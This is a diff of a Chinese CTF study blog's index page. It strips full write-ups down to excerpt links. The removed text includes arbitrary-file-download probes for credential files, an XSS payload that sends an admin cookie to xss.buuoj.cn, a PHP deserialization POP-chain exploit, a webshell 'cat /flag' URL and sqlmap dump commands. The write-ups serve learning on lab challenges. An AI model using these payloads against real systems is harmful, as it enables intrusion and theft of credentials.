-<p>然后就可以知道：<br><img src="/2021/04/05/daima/4.png"><br>访问<br><code>url+/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code><br>就可以得到flag.<br><img src="/2021/04/05/daima/6.png"></p>
-
+              <p>打开题目链接，如下：<br><img src="/2021/04/05/daima/2.png"><br>下载文件：<br><img src="/2021/04/05/daima/1.png"></p>
+          
       
     </div>
     
@@ -844,6 +652,10 @@ if __name__ == ‘__main__‘:
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2021/04/05/daima/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -892,83 +704,11 @@ if __name__ == ‘__main__‘:
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2>知识点(任意下载漏洞)<h2>
+              <h2>知识点(任意下载漏洞)<h2>
 
 
-<p><b style="color:pink">任意下载漏洞简介</b><br>由于业务需求，很多网站往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可以利用这种方式下载服务器的敏感文件，对服务器进行进一步的威胁和攻击。</p>
-<p><b style="color:pink">任意下载漏洞的危害</b><br>通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等。<br>通过上面的简单介绍，可以看出任意下载漏洞是很常见的，如果对用户查看或下载的文件不做限制，就又可能被利用，从而造成损害，接下来就来学习下任意下载漏洞是如何利用的。</p>
-<p><b style="color:pink">存在方式：</b><br>从链接上看，如下便有可能存在任意下载漏洞</p>
-<ol>
-<li>download.php?path=
-</li><li>download.php?file=
-</li><li>down.php?file=
-</li><li>data.php?file=
-</li><li>readfile.php?file=
-</li><li>read.php?filename=
-</li></ol>
-
-<p><b style="color:pink">WEB-INF常用的目录或文件</b></p>
-<ol>
-<li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
-</li><li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
-</li><li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
-</li><li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
-</li><li>/WEB-INF/database.properties：数据库配置文件
-</li></ol>
-
-<p><b style="color:pink">漏洞总结</b><br>从参数名上看，大致有：</p>
-<ol>
-<li>&readpath=
-</li><li>&filepath=
-</li><li>&Path=
-</li><li>&inputfile=
-</li><li>&url=
-</li><li>&Lang=
-</li><li>&dis=
-</li><li>&data=
-</li><li>&readfile=
-</li><li>&menu=
-</li><li>META-INF=
-</li><li>WEB-INF
-</li></ol>
-
-<p>这些参数可能会出现漏洞<br><b>linux和Windows下载利用文件</b><br>windows:</p>
-<ol>
-<li>C:\boot.ini //查看系统版本
-</li><li>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
-</li><li>C:\Windows\repair\sam //存储系统初次安装的密码
-</li><li>C:\Program Files\mysql\my.ini //Mysql配置
-</li><li>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
-</li><li>C:\Windows\php.ini //php配置信息
-</li><li>C:\Windows\my.ini //Mysql配置信息
-</li><li>C:\Windows\win.ini //Windows系统的一个基本系统配置文件
-</li></ol>
-
-<p>linux:</p>
-<ol>
-<li>root/.ssh/authorized_keys如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去
-</li><li>/root/.ssh/id_rsa//ssh私钥,ssh公钥是id_rsa.pub
-</li><li>/root/.ssh/id_ras.keystore//记录每个访问计算机用户的公钥
-</li><li>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
-</li><li>/etc/passwd
-</li><li>/etc/shadow//账户密码文件
-</li><li>/etc/my.cnf //mysql配置文件
-</li><li>/etc/httpd/conf/httpd.conf //apache配置文件
-</li><li>/root/.bash_history //用户历史命令记录文件
-</li><li>/root/.mysql_history //mysql历史命令记录文件
-</li><li>/proc/mounts //记录系统挂载设备
-</li><li>/porc/config.gz //内核配置文件
-</li><li>/var/lib/mlocate/mlocate.db //全文件路径
-</li><li>/porc/self/cmdline //当前进程的cmdline参数
-</li></ol>
-
-<p><b style="color:pink">漏洞验证</b><br>xxx.php?f=../../../../../../etc/passwd<br>xxx.php?f=../index.php<br>xxx.php?f=ﬁle:///etc/passwd</p>
-<p>参数f的参数值为PHP文件时：<br>  1.件被解析，则是文件包含漏洞<br>  2.显示源代码，则是文件查看漏洞<br>  3.提示下载，则是文件下载漏洞</p>
-<p>最后附上大佬总结的资源：<a target="_blank" rel="noopener" href="https://github.com/tutorial0/payloads/blob/master/lfi.txt">是各种文件路径鸭</a></p>
-<h2>[RoarCTF 2019]Easy Java 1</h2>
-
-<p>emm这道题我直接想到的就是sql注入试了半天没有结果，作为web选手的我留下了不懂ctf的泪<br>直接看题目：<br><img src="/2021/04/01/b/1.png"><br>这样色儿的<br>一顿操作猛如虎admin admin888<br><img src="/2021/04/01/b/2.png"><br>euuuu我开始还觉得这个图片有猫腻，是我想多了=|=<br>又突然发现下方那小小的help，点击如下：<br><img src="/2021/04/01/b/3.png"><br>java fliename 难道java也有伪协议？百度搜索并没有<br>偷瞄一下别人wp，原来是java任意文件下载。<br><code>url/Download?filename=WEB-INF/web.xml</code><br><code>POST:filename=WEB-INF/web.xml</code><br><img src="/2021/04/01/b/4.png"><br>还要要post传参，怎么说呢，就很厉害（gou）<br>这样一来我们旧的到了一个文件打开后是这样色儿的：<br><img src="/2021/04/01/b/5.png"><br>有疑似flag的路径，我们来访问下，要在路径前面加上classes<br><code>url/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code><br><code>POST:filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code><br>通过记事本的方式大开<br><img src="/2021/04/01/b/6.png"><br>里面有段base64编码：ZmxhZ3s1ZjY5MjkxMi0yN2Q0LTRhN2EtYjdlMC04MjAyMTdlYzA2NjR9Cg==<br>解密后便是flag</p>
-</h2></h2>
+<p><b style="color:pink">任意下载漏洞简介</b><br>由于业务需求，很多网站往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可以利用这种方式下载服务器的敏感文件，对服务器进行进一步的威胁和攻击。</p></h2></h2>
+          
       
     </div>
     
@@ -977,6 +717,10 @@ if __name__ == ‘__main__‘:
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2021/04/01/b/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1025,38 +769,11 @@ if __name__ == ‘__main__‘:
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1>[CISCN2019 华东北赛区]Web2</h1>
+              <h1>[CISCN2019 华东北赛区]Web2</h1>
 <h2>题目</h2>
 
 <p><img src="/2021/03/31/xxs/1.png"><br>题目有两个窗口，吐槽和登录<br>没有注册界面，直接吐槽叭</p>
-<h2>题解</h2>
-
-<p>尝试弹窗<code>&lt;script&gt;alert(1)&lt;/script&gt</code><br>emmm并没有任何东西跳出来，那我们换一个html标签试试：<code>&lt;IMG SRC=&quot;javascript.:alert(&#039;XSS&#039;);&quot;&gt</code><br><img src="/2021/03/31/xxs/2.png"><br>有个不为人知的图片，看来是存在xxs漏洞了<br>吐槽页面是用来放XSS的，然后在反馈给管理员这样我们就能拿到管理员的cookie，因为这里是内网环境，所以只能去 <a target="_blank" rel="noopener" href="http://xss.buuoj.cn/index.php?do=login">http://xss.buuoj.cn/index.php?do=login</a> 注册账号来接收cookie。</p>
-<pre>&lt;/textarea&gt;'"&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxss.buuoj.cn%2F8sVXk7%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;
-</pre>
-<p>代码写在吐槽上提交，访问，在xxs平台上就可以看到cookie和访问链接：<br><img src="/2021/03/31/xxs/3.png"><br>利用管理员的cookie，以及来访地址…node3.buuoj.cn/backend/admin.php登录即可得到flag（用chrome的edit this cookie插件比较方便）<br><img src="/2021/03/31/xxs/4.png"></p>
-<h1>知识点</h1>
-<h2>0x01xss作用</h2>
-
-<p>emm完全不知道xxs是什么的我看了赵大佬的讲座，附上学习链接，记得白嫖：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1XE411f7qT?from=search&seid=6094814016757224378">我爱学习~~</a><br>常见的输出函数：print()、 print_r()、 echo、 printf()、 sprintf()、 die()、 var_dump()、 var_export()<br>xss是往页面中添加了一段代码，并且被浏览器执行了<br>反射型将恶意代码写入参数，或者自己服务器上搭个form表单传送，用来钓鱼<br>存储型就等着别人点这个网页就行了</p>
-<h2>0x02手段</h2>
-
-<p>xss主要出现的地方：文章发表，评论回复，留言，资料设置等<br>xss无非就是要对方的cookie，但是常常会有httponly导致cookie并不能传到xss平台，这是一种有效的防御方式<br>但是xss预防应该从本质出发，即对该页面用户输入不能被执行<br>xss触发方法<br>利用script标签执行js<br>字符串用” ‘ 包裹都行<br>采用on事件方法<br>on事件不用单引号或双引号也可以触发，但是必须闭合标签内的引号<br>=&gt;点击就会触发 =&gt;鼠标移动触发<br>能够使用on事件的标签<br>支持on click事件的标签有</p>
-<ul>
-<li>, , , , ,
-</li><li>, , ,
-</li><li>, , , , ,
-</li><li>, , , , ,,
-</li><li>to
-</li><li>, , , , , ,
-</li></ul>
-
-<p>采用a标签来做到xss</p>
-<h2>0x03bypass方法</h2>
-
-<p>采用编码，把字符串可以进行编码<br>后接十进制 =&gt; unicode编码<br>​ 后接十六进制 =&gt; unicode编码<br>采用标签中的空隙规则<br>假设正则是<br>]*)&gt;([\s\S][^<br>可以采用<br>==&gt; 最后有个p和&gt;间有空格绕过<br>采用双写绕过空字符替换<br>如果被删除关键字，可以采用重写方法比如<br>用大小写绕过不严格的waf<br>采用参数覆盖，覆盖掉hidden参数<br>我们输入的内容为：” onmouseover=alert(1) type=”text<br>有些标签的优先级高于”,导致执行xss</p>
-<p>最后不明白那段代码是个什么意思，xxs也没改明白，在慢慢研究吧！</p>
-
+          
       
     </div>
     
@@ -1065,6 +782,10 @@ if __name__ == ‘__main__‘:
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2021/03/31/xxs/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1113,7 +834,7 @@ if __name__ == ‘__main__‘:
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>打开题目，给出如下代码:</p>
+              <p>打开题目，给出如下代码:</p>
 <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token comment">//flag is in flag.php</span>
 <span class="token comment">//WTF IS THIS?</span>
@@ -1169,100 +890,7 @@ if __name__ == ‘__main__‘:
 <span class="token punctuation">&#125;</span> 
 </code></pre> 
 <p><code>反序列化pop链魔法函数</code>，魔法函数方法在前面有总结</p>
-<ol>
-<li>题目通过get传入参数pop，会自动调动Show中的<code>_wake up()</code>
-</li><li>_wake up()通过过滤对<code>$this->source</code>做字符串比较，如果$this->source是Show类，就调用了__toString()
-</li><li>如果__toString()其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的_get()方法。
-</li><li>如果_get()中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的_invoke()方法。
-</li><li>利用文件包含漏洞，使用_invoke()读取flag.php的内容。
-</li></ol>
-
-<p><b>反序列化构造pop链的题目要注意两个点</b><br><code>1.入口点，反序列化POP链构造的入口</code><br><code>2.找危险函数，如果含有某些危险函数就可能导致漏洞达到目的</code><br>关于入口点要之一一些魔术方法：如<code>__construct 、__desstruct、__wakeup</code>等等<br>观察代码，发现有一个函数<code>include()</code>的内容可控，这里就可能造成文件包含漏洞<br>而反序列化的入口点在Show类中</p>
-<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
-    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">&#61;</span><span class="token single-quoted-string string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token single-quoted-string string">&#39;Welcome to &#39;</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&#34;&lt;br&gt;&#34;</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
-            <span class="token keyword">echo</span> <span class="token double-quoted-string string">&#34;hacker&#34;</span><span class="token punctuation">;</span>
-            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token double-quoted-string string">&#34;index.php&#34;</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-</code></pre> 
-
-<p>使用unserialize时触发<code>__wakeup()</code>，对$this-&gt;source正则匹配过滤关键字，如果$this-&gt;source此时是一个类的话，此时类就被当成了一个实例化对象，就会触发<code>__tostring</code></p>
-<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
-    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
-        <span class="token variable">$function</span> <span class="token operator">&#61;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-</code></pre> 
-
-<p>Test类中的<code>__get()，__toString()</code>访问了str的source属性，str是Test类，不存在source属性，就会调用Text中的<code>__get()</code></p>
-<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
-    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
-        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-<span class="token punctuation">&#125;</span>
-</code></pre> 
-
-<p><code>__get()</code>方法将p作为函数使用&#xff0c;p实例化为<code>Modify</code>类&#xff0c;就调用了Modifier的<code>__invoke()</code>方法&#xff1b;<br> <code>__invoke()</code>调用了<code>append()</code>方法&#xff0c;包含<code>$value</code>&#xff0c;若将<code>$value</code>为伪协议&#xff0c;则可读flag.php源码</p> <p></p>
-<p>构造POP链:/p>
-
-</p><p>$a = new Show();<br>$a-&gt;source = new Show();<br>$a-&gt;source-&gt;str-&gt;p = new Modifier();</p>
-<p>echo urlencode(serialize($a));</p>
-<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
-    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">&#61;</span><span class="token double-quoted-string string">&#34;php://filter/read&#61;convert.base64-encode/resource&#61;flag.php&#34;</span><span class="token punctuation">;</span>
-
-<span class="token punctuation">&#125;</span>
-
-
-<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
-    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
-
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
-    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-
-<span class="token variable">$a</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-
-<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token delimiter important">?&gt;</span>
-</code></pre>
-
-<p>运行得到payload<br><img src="/2021/03/30/pop/1.png"><br>p:<br><code style="color:blue">?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BN%3B%7D%7D<br></code><br>得到base64编码，解密得到flag</p>
-
+          
       
     </div>
     
@@ -1271,6 +899,10 @@ if __name__ == ‘__main__‘:
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2021/03/30/pop/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1319,7 +951,7 @@ if __name__ == ‘__main__‘:
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>这周，出了到web题，反序列化魔法函数，emmm题我是没做出来（别问，问就是我是废物wuwuwuwu~），但我总结了相关知识点，假以时日，但愿总结着终结着我就会了</p>
+              <p>这周，出了到web题，反序列化魔法函数，emmm题我是没做出来（别问，问就是我是废物wuwuwuwu~），但我总结了相关知识点，假以时日，但愿总结着终结着我就会了</p>
 <h3>正文</h3>
 
 <p><font size="4"><b style="color:pink">魔法函数实例</b></font><br>PHP类中有一种特殊函数体的存在叫魔法函数，magic函数命名是以符号__开头的，如：</p>
@@ -1341,143 +973,7 @@ if __name__ == ‘__main__‘:
 </li><li>__debugInfo()  此方法由var_dump（）调用
 
 </li></ul>
-
-<p><b>这些函数在某些情况下会自动调用</b><br><font size="5"><b style="color:blue">①构造函数☞ __construct()</b></font><br><b>作用： </b>通常用于初始化对象的属性<br><b>自动调用与： </b>对象创建时自动调用<br><img src="/2021/03/25/fxl/1.png"><br><font size="5"><b style="color:blue">②析构函数☞ __destruct()</b></font><br>自动调用与： 当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。<br>析构函数无参数<br>eg：一个实列<br><img src="/2021/03/25/fxl/2.png"><br>当前对象的name属性为:is A<br>.<br>—-销毁对象后—-<br>当前对象已被销毁<br><font size="5"><b style="color:blue">③对对象的封装时的魔法函数</b></font><br>//__get() 外部访问不存在或者=私有属性时调用<br>//__set() 外部访问不存在或者=私有属性时调用<br>//__isset() 在外部检测是否存在某个属性时调用<br>//__unset() 外部销毁某个私有属性时调用时调用<br><font size="5"><b style="color:blue">④序列化和反序列化的魔法函数</b></font><br><b>__sleep()</b><br>自动调用时机：序列化时<br>作用：将允许序列化的对象放在一组数组中返回，序列化时只序列化指定的属性。<br><img src="/2021/03/25/fxl/3.png"><br><img src="/2021/03/25/fxl/4.png"><br><b>__wakeup()</b><br>自动调用时机：反序列化时<br>作用：反序列化时修改属性（对重新生成的对象的属性进行修改），或重新建立数据库连接，或执行其它初始化操作。<br>例1 ：<br><img src="/2021/03/25/fxl/5.png"><br><img src="/2021/03/25/fxl/6.png"><br>例2 重新建立数据库连接<br><img src="/2021/03/25/fxl/7.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-gj" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/03/20/gj/" class="article-date">
-      <time datetime="2021-03-20T12:41:26.000Z" itemprop="datePublished">2021-03-20</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/03/20/gj/">Web步骤</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
           
-        <p><b style="color:pink">1. 看源码</b></p>
-<p>可以右键-&gt;【查看网页源代码】，也可以用火狐和谷歌浏览器的按F12键，按F12键可以修改html源代码方便构造一些值提交，但如果不需要的话直接右键查看源代码更直观，看网页里面的注释之类的都很方便。</p>
-<p><b style="color:pink">2. 抓包&lt;/b.&gt;</b></p>
-<p>这几天接触到的抓包一般是用burpsuite，如果要多次尝试可以右键-&gt;【send to Repeater】，如果要对某个字段爆破可以右键-&gt;【send to Intruder】，这是我比较常用的两种burpsuite的功能。</p>
-<p>今天还接触到谷歌浏览器：F12-&gt;Network-&gt;勾选【Preserve log】，也可以方便查看请求包和响应包的数据（包头字段和网页数据等）。</p>
-<p><b style="color:pink">3. 关注的几个地方</b></p>
-<p>有时候打开网页后感觉没有可疑的地方，首先查看下源代码，看有没有注释之类的提示信息，之后重新打开网页，抓抓包看下请求包响应包的包头数据有没有可疑的地方。</p>
-<p><b style="color:pink">4. include漏洞</b></p>
-<p>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
-<p>PHP://filter/read=convert.base64-encode/resource=文件名(如index.php)
- </p>
-<p><b style="color:pink">5. 代码审计</b></p>
-<p>需要多次动态调试来尝试，以及要关注里面出现的函数，出现在关键位置的函数一般都是有用的，搜索一下有没有相关的漏洞。</p>
-<p>还有一些和数据处理有关的绕过，如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null，除了遇到时多百度之外，平时也需要多积累到时候才能想到。</p>
-<p>还有GET参数构造的时候如果传入的是数组要记得加[]，？txt[]=[1,2,3]，如果填?txt=[1,2,3]似乎不会被当做array处理。</p>
-<p><b style="color:pink">6.编码</b></p>
-<p>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间。</p>
-<p>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：</p>
-<p><a target="_blank" rel="noopener" href="https://emn178.github.io/online-tools/base64_decode.html">https://emn178.github.io/online-tools/base64_decode.html</a></p>
-<p>可以解好几种，界面也很简洁。</p>
-<p><b style="color:pink">7.SQL注入</b></p>
-<p>最近搞清楚了布尔注入，盲注之类的意思，布尔注入就像一个只会告诉你对或错的机器人，然后你去问他问题从而解决问题，盲注是说不会有提示信息，虽然对数据库的操作依然存在，但是不论是否操作成功都不会告诉你。</p>
-<p>a&gt;对一个注入语句记个笔记：</p>
-<p>%df’ union select 1,database() %23 %df’ union select 1,string from sql5.key %23</p>
-<p>%df是在编码为gbk的时候用于宽字节注入的；%23就是#，但是用#不能通过；还有可以直接用 union select 字段名 from 数据库名.表名 的方式获取字段的值。</p>
-<p>b&gt;对用sqlmap进行手工注入的一些步骤记个笔记首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。</p>
-<p>python sqlmap.py -u “url” –level 3 –batch –dbs python sqlmap.py -u “url” –level 3 –batch -D ctf –tables python sqlmap.py -u “url” –level 3 –batch -D ctf -T flag –columns –dump</p>
-<p>–batch sqlmap不会询问你输入 全部默认确定</p>
-<p>–level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段</p>
-<p>–（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。</p>
-<p>c&gt;还有一些用union select来获得数据库信息的，链接</p>
-<p><a target="_blank" rel="noopener" href="http://www.2cto.com/article/201208/151503.html">http://www.2cto.com/article/201208/151503.html</a></p>
-<p>讲得很全面。</p>
-<ol>
-<li><p>@@version() MYSQL版本 </p>
-</li>
-<li><p>@@database() 当前数据库 </p>
-</li>
-<li><p>@@user() 当前用户 </p>
-</li>
-<li><p>@@datadir 当前数据库路径 </p>
-</li>
-<li><p>@@version_compile_os 操作系统版本</p>
-</li>
-<li><p>concat(str1,str2,…) 没有分隔符地连接字符串 </p>
-</li>
-<li><p>concat_ws(separator,str1,str2,…) 用分隔符连接字符串 </p>
-</li>
-<li><p>group_concat(str1,str2,…) 用逗号分隔字符串</p>
-</li>
-<li><p>查数据库名，用户名<br>union select 1,2,concat(user(),database(),version()),4,……,N –<br>（最后–用于注释掉后面sql语句避免出错）得到数据库名 </p>
-</li>
-<li><p>查表名： union select group_concat(0x0a,table_name),2<br>from information_schema.tables<br>where table_schema=库名十六进制#<br>（库名十六进制可以用database()代替） </p>
-</li>
